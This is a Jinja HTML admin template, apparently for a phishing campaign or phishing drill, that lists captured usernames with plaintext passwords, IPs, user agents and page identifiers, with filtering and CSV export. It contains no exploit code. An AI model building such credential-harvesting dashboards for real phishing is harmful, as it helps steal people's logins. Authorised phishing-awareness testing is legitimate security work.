<style>
	body {
		background: linear-gradient(135deg, #e3f0ff 0%, #b3cfff 100%);
		font-family: 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', Arial, sans-serif;
		min-height: 100vh;
	}
	.blue-container {
		max-width: 900px;
		margin: 40px auto 0 auto;
		background: rgba(255,255,255,0.95);
		border-radius: 16px;
		box-shadow: 0 8px 32px 0 rgba(31,38,135,0.10);
		padding: 36px 36px 24px 36px;
		border: 1.5px solid #c3d0e6;
	}
	h2 {
		text-align: center;
		font-weight: 600;
		color: #2566d8;
		letter-spacing: 2px;
		margin-bottom: 28px;
		text-shadow: 0 2px 8px #e3f0ff;
	}
	.of-btn {
		background: linear-gradient(90deg, #4f8cff 0%, #2566d8 100%);
		color: #fff;
		border: none;
		border-radius: 6px;
		padding: 7px 20px;
		font-size: 15px;
		cursor: pointer;
		transition: background 0.2s;
		box-shadow: 0 2px 8px #e6eaf1;
	}
	.of-btn:hover { background: linear-gradient(90deg, #2566d8 0%, #4f8cff 100%); }
	.of-input, .of-select {
		border: 1.5px solid #b3cfff;
		border-radius: 6px;
		padding: 5px 10px;
		font-size: 14px;
		margin-right: 8px;
		outline: none;
		transition: border 0.2s;
		background: #f7fbff;
	}
	.of-input:focus { border: 1.5px solid #2566d8; }
	.of-table {
		border-collapse: collapse;
		font-size: 14px;
		min-width: 900px;
		box-shadow: 0 2px 8px #e6eaf1;
		border-radius: 10px;
		overflow: hidden;
		background: #f7fbff;
	}
	.of-table th, .of-table td {
		padding: 10px 8px;
		border: 1px solid #e3e8f0;
	}
	.of-table th {
		background: #e3f0ff;
		font-weight: bold;
		color: #2566d8;
	}
	.of-table tr:nth-child(even) { background: #f7fbff; }
	.of-table tr:nth-child(odd) { background: #fff; }
</style>
<div class="blue-container">
<div style="display:flex;gap:40px;align-items:center;margin-bottom:20px;">
	<div style="background:#f0f4fa;padding:18px 32px;border-radius:8px;box-shadow:0 2px 8px #e6eaf1;">
		<div style="font-size:15px;color:#888;">凭证总数</div>
		<div style="font-size:28px;font-weight:bold;color:#2a3b4d;">{{ cred_count }}</div>
	</div>
	<div style="background:#f0f4fa;padding:18px 32px;border-radius:8px;box-shadow:0 2px 8px #e6eaf1;">
		<div style="font-size:15px;color:#888;">收信人总数</div>
		<div style="font-size:28px;font-weight:bold;color:#2a3b4d;">{{ emp_count }}</div>
	</div>
</div>
<h2>凭证列表</h2>
<form method="get" style="margin-bottom:10px;">
	用户名：<input class="of-input" type="text" name="username" value="{{ username }}" style="width:100px;">
	IP：<input class="of-input" type="text" name="ip" value="{{ ip }}" style="width:100px;">
	页面标识：<input class="of-input" type="text" name="scene" value="{{ scene }}" style="width:100px;">
	<button class="of-btn" type="submit">筛选</button>
	<a class="of-btn" href="{{ url_for('admin.creds_export') }}" style="margin-left:20px;">导出CSV</a>
</form>
<form method="post" onsubmit="return confirm('确定要删除选中项吗？');">
<input type="hidden" name="action" value="delete">
<table class="of-table">
	<tr>
		<th><input type="checkbox" onclick="var cbs=document.querySelectorAll('[name=delete_ids]');for(var i=0;i<cbs.length;i++)cbs[i].checked=this.checked;"> </th>
		<th>ID</th><th>用户名</th><th>明文密码</th><th>IP</th><th>时间</th><th>页面标识</th><th>User-Agent</th><th>扩展信息</th>
	</tr>
	{% for cred in creds %}
	<tr>
		<td><input type="checkbox" name="delete_ids" value="{{ cred.id }}"></td>
		<td>{{ cred.id }}</td>
		<td>{{ cred.username }}</td>
		<td>{{ cred.raw_password }}</td>
		<td>{{ cred.ip }}</td>
		<td>{{ cred.timestamp }}</td>
		<td>{{ cred.scene }}</td>
		<td style="max-width:200px;word-break:break-all;">{{ cred.user_agent }}</td>
		<td style="max-width:120px;word-break:break-all;">{{ cred.extra_info }}</td>
	</tr>
	{% endfor %}
</table>
<button class="of-btn" type="submit" style="margin-top:10px;">批量删除</button>
</form>
</div>
